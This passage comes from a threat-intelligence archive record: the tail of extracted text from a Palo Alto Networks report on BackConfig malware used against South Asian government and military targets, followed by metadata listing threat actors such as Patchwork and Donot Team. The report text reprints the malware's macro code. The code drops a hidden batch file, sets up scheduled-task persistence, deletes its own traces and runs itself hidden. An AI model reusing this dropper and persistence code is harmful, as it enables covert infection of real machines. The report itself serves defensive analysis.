Nothing\n\n End if\n\n Set objXMLHTTP = Nothing \n\n“Setup” BAT component\n\n\n\n[Audio.txt -> Audio.bat CODE]\n\n\n#### 1\n\n 2\n\n 3\n\n\n#### Set oFile = fso.CreateTextFile(\"c:\\Drivers\\Audio.txt\")\n\n oFile.WriteLine (\"echo off\")\n\n oFile.WriteLine (\"md %USERPROFILE%\\Adobe\\Driver\\pdf\")\n\n\n-----\n\n#### 4\n\n 5\n\n 6\n\n 7\n\n 8\n\n 9\n\n 10\n\n 11\n\n 12\n\n 13\n\n 14\n\n 15\n\n 16\n\n 17\n\n 18\n\n 19\n\n 20\n\n 21\n\n 22\n\n 23\n\n 24\n\n 25\n\n 26\n\n 27\n\n 28\n\n 29\n\n 30\n\n 31\n\n 32\n\n\n#### oFile.WriteLine (\"md %USERPROFILE%\\Adobe\\Driver\\dwg\")\n\n oFile.WriteLine (\"md %USERPROFILE%\\Daily\\Backup\\Files\")\n\n oFile.WriteLine (\"attrib +a +h +s %USERPROFILE%\\Adobe\")\n\n oFile.WriteLine (\"attrib +a +h +s %USERPROFILE%\\Daily\")\n\n oFile.WriteLine (\"attrib +a +h +s C:\\Drivers\")\n\n oFile.WriteLine (\"del /f\n\n %USERPROFILE%\\Adobe\\Driver\\pdf\\pid.txt\")\n\n oFile.WriteLine (\"del /f\n\n %USERPROFILE%\\Adobe\\Driver\\dwg\\pid.txt\"\n\n oFile.WriteLine (\"SET /A %COMPUTERNAME%\")\n\n oFile.WriteLine (\"SET /A RAND=%RANDOM% 10000 + 1\")\n\n oFile.WriteLine (\"echo %COMPUTERNAME%-%RAND% >>\n\n %USERPROFILE%\\Adobe\\Driver\\pdf\\pid.txt\")\n\n oFile.WriteLine (\"echo %COMPUTERNAME%-%RAND% >>\n\n <strong>%USERPROFILE%\\Adobe\\Driver\\dwg\\pid.txt\")</strong>\n\n oFile.WriteLine (\"schtasks /delete /tn Winmgt_log /f\")\n\n oFile.WriteLine (\"schtasks /delete /tn Yahoo_Drive /f\")\n\n oFile.WriteLine (\"schtasks /create /sc minute /mo 10 /f /tn\n\n Winmgt_log /tr C:\\Drivers\\dphc.exe\")\n\n oFile.WriteLine (\"schtasks /create /sc minute /mo 20 /f /tn\n\n Yahoo_Drive /tr C:\\Drivers\\Drive.vbs\")\n\n oFile.WriteLine (\"ren C:\\Drivers\\Drive.txt Drive.vbs \")\n\n oFile.WriteLine (\"del %0\")\n\n oFile.Close\n\n Set fso = Nothing\n\n Set oFile = Nothing\n\n   Dim OldName, NewName\n\n   GivenLocation = \"C:\\Drivers\\\"\n\n   OldName = \"Audio.txt\"\n\n\n-----\n\n#### 33\n\n 34\n\n 35\n\n 36\n\n 37\n\n 38\n\n 39\n\n 40\n\n 41\n\n\n####   <strong>NewName = \"Audio.bat\"</strong>\n\n   On Error Resume Next\n\n   Name GivenLocation & OldName As GivenLocation & NewName\n\n   Dim RetVal\n\n   RetVal = Shell(\"C:\\Drivers\\Audio.bat\", vbHide)\n\n\n### Get updates from Palo Alto Networks!\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2020/2020.05.11_BackConfig_South_Asia/Updated%20BackConfig%20Malware%20Targeting%20Government%20and%20Military%20Organizations%20in%20South%20Asia.pdf"
    ],
    "report_names": [
        "Updated BackConfig Malware Targeting Government and Military Organizations in South Asia"
    ],
    "threat_actors": [
        {
            "id": "b740943a-da51-4133-855b-df29822531ea",
            "created_at": "2022-10-25T15:50:23.604126Z",
            "updated_at": "2025-03-27T02:00:55.505366Z",
            "deleted_at": null,
            "main_name": "Equation",
            "aliases": [
                "Equation"
            ],
            "source_name": "MITRE:Equation",
            "tools": null,
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "2ac63ef4-a7b8-4a30-96ad-b30ccb2073fc",
            "created_at": "2022-10-25T16:07:23.546262Z",
            "updated_at": "2025-03-27T02:02:09.856624Z",
            "deleted_at": null,
            "main_name": "Donot Team",
            "aliases": [
                "APT-C-35",
                "SectorE02"
            ],
            "source_name": "ETDA:Donot Team",
            "tools": [
                "BackConfig",
                "EHDevel",
                "Jaca",
                "yty"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "ca292585-950c-400f-b632-c19fa3491fe1",
            "created_at": "2022-10-25T15:50:23.599765Z",
            "updated_at": "2025-03-27T02:00:55.504509Z",
            "deleted_at": null,
            "main_name": "MONSOON",
            "aliases": null,
            "source_name": "MITRE:MONSOON",
            "tools": [
                "TINYTYPHON",
                "BADNEWS",
                "Unknown Logger",
                "AutoIt backdoor"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "88854a9f-641a-4412-89db-449b4d5cbc51",
            "created_at": "2022-10-25T16:07:23.963599Z",
            "updated_at": "2025-03-27T02:02:10.051548Z",
            "deleted_at": null,
            "main_name": "Operation HangOver",
            "aliases": [
                "Monsoon",
                "Operation HangOver",
                "Viceroy Tiger"
            ],
            "source_name": "ETDA:Operation HangOver",
            "tools": [
                "AutoIt backdoor",
                "BADNEWS",
                "BackConfig",
                "JakyllHyde",
                "TINYTYPHON",
                "Unknown Logger",
                "WSCSPL"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "cfdd350b-de30-4d29-bbee-28159f26c8c2",
            "created_at": "2023-01-06T13:46:38.433736Z",
            "updated_at": "2025-03-27T02:00:02.832565Z",
            "deleted_at": null,
            "main_name": "VICEROY TIGER",
            "aliases": [
                "OPERATION HANGOVER",
                "Donot Team",
                "APT-C-35",
                "SectorE02",
                "Orange Kala"
            ],
            "source_name": "MISPGALAXY:VICEROY TIGER",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "7ea1e0de-53b9-4059-802f-485884180701",
            "created_at": "2022-10-25T16:07:24.04846Z",
            "updated_at": "2025-03-27T02:02:10.090459Z",
            "deleted_at": null,
            "main_name": "Patchwork",
            "aliases": [
                "APT-C-09",
                "ATK 11",
                "Capricorn Organisation",
                "Chinastrats",
                "Dropping Elephant",
                "Maha Grass",
                "Quilted Tiger",
                "TG-4410",
                "Thirsty Gemini",
                "Zinc Emerson"
            ],
            "source_name": "ETDA:Patchwork",
            "tools": [
                "AndroRAT",
                "Artra Downloader",
                "ArtraDownloader",
                "AutoIt backdoor",
                "BADNEWS",
                "BIRDDOG",
                "Bahamut",
                "Bozok",
                "Bozok RAT",
                "Brute Ratel",
                "Brute Ratel C4",
                "CinaRAT",
                "Crypta",
                "ForeIT",
                "JakyllHyde",
                "Loki",
                "Loki.Rat",
                "LokiBot",
                "LokiPWS",
                "NDiskMonitor",
                "Nadrac",
                "PGoShell",
                "PowerSploit",
                "PubFantacy",
                "Quasar RAT",
                "QuasarRAT",
                "Ragnatela",
                "Ragnatela RAT",
                "SocksBot",
                "TINYTYPHON",
                "Unknown Logger",
                "WSCSPL",
                "Yggdrasil"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "9c884c88-2c9f-49c5-856a-2383ad1d8ef8",
            "created_at": "2024-05-01T02:03:08.152Z",
            "updated_at": "2025-03-27T02:05:17.422887Z",
            "deleted_at": null,
            "main_name": "ZINC EMERSON",
            "aliases": [
                "Dropping Elephant ",
                "EHDevel ",
                "Manul ",
                "Monsoon ",
                "Operation Hangover ",
                "Patchwork ",
                "TG-4410 ",
                "Viceroy Tiger ",
                "Confucius "
            ],
            "source_name": "Secureworks:ZINC EMERSON",
            "tools": [
                " Hanove",
                " Mac OS X KitM Spyware",
                " Proyecto2",
                " YTY Backdoor",
                "Enlighten Infostealer"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "c81067e0-9dcb-4e3f-abb0-80126519c5b6",
            "created_at": "2022-10-25T15:50:23.285448Z",
            "updated_at": "2025-03-27T02:00:55.42906Z",
            "deleted_at": null,
            "main_name": "Patchwork",
            "aliases": [
                "Hangover Group",
                "Dropping Elephant",
                "Chinastrats",
                "Operation Hangover"
            ],
            "source_name": "MITRE:Patchwork",
            "tools": [
                "NDiskMonitor",
                "QuasarRAT",
                "BackConfig",
                "TINYTYPHON",
                "AutoIt backdoor",
                "PowerSploit",
                "BADNEWS",
                "Unknown Logger",
                "Socksbot"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1666716492,
    "ts_updated_at": 1743041706,
    "ts_creation_date": 1589516507,
    "ts_modification_date": 1589516507,
    "files": {
        "pdf": "https://archive.orkl.eu/d0acc76ee3510cbde8145e5c7d83e42f8b863123.pdf",
        "text": "https://archive.orkl.eu/d0acc76ee3510cbde8145e5c7d83e42f8b863123.txt",
        "img": "https://archive.orkl.eu/d0acc76ee3510cbde8145e5c7d83e42f8b863123.jpg"
    }
}